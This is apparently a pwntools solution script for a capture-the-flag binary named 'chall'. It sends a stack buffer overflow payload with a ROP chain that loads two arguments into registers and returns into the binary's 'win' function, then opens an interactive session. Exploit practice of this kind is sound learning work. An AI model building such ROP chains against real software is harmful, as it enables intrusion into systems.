from pwn import *

OFFSET = 36

elf = ELF("./chall")

io = elf.process()
gdb.attach(io)

POP_RDI = 0x0000000000400933
POP_RSI = 0x0000000000400931

payload = b"A"* 40 + p32(0x1f4) +  p32(0x190) +  b"A"*8 + p64(POP_RDI) + p64(0xdeadbeef) + p64(POP_RSI) + p64(0x1337) + p64(0x080491d6) + p64(elf.symbols.win)

io.sendline(payload)

io.interactive()
